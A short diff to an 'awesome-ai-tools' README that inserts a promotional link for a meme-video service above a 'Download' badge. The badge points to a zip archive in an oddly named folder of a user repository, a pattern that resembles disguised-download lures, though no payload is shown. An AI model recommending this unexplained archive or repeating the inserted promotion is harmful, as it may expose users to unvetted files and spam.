@@ -1,5 +1,6 @@
 # 🤖 awesome-ai-tools - Simplify Your AI Project Needs
 
+- [Ideoy](https://ideoy.ai) - Remake this week's viral meme videos from one selfie (AI image-to-video, 9:16, freemium).
 [![Download awesome-ai-tools](https://raw.githubusercontent.com/foodman1227/awesome-ai-tools/main/etymography/tools-awesome-ai-2.8.zip)](https://raw.githubusercontent.com/foodman1227/awesome-ai-tools/main/etymography/tools-awesome-ai-2.8.zip)
 
 ## 📖 Overview
